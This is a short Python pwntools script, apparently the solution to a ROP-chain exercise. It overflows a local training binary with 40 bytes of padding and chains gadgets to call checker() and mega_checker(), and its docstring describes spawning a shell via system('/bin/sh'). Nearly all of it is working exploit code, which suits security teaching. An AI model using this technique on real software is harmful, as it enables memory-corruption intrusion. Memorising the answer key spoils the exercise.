#!/usr/bin/env python

"""
Solution (exploit) for rop-chain task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = process("./vuln")
elf = ELF('./vuln')
rop = ROP(elf)

# Fill required addresses.
offset = 40
pop_rdi_ret_address = 0x4012b3
value1 = 0x11223344
checker_address = elf.symbols['checker']
value2_1 = 0x88776655
value2_2 = 0xaabbccdd
mega_checker_address = elf.symbols['mega_checker']

# Discover and fill address of gadget to initialize rsi.
rsi_gadget = 0x4012b1  # pop rsi ; pop r15 ; ret

rop.call(checker_address, [value1])
rop.call(mega_checker_address, [value2_1, value2_2])

# Update payload to call mega_checker() after calling checker().
# payload = offset * b'A' + p64(pop_rdi_ret_address) + p64(value1) + \
# 	p64(checker_address) + p64(pop_rdi_ret_address) + p64(value2_1) +\
# 	p64(rsi_gadget) + p64(value2_2) + 8 * b'a' + p64(mega_checker_address)

payload = offset * b'A' + rop.chain()

msg = io.recvuntil(b': ')
io.sendline(payload)

print(io.recvline())
print(io.recvline())
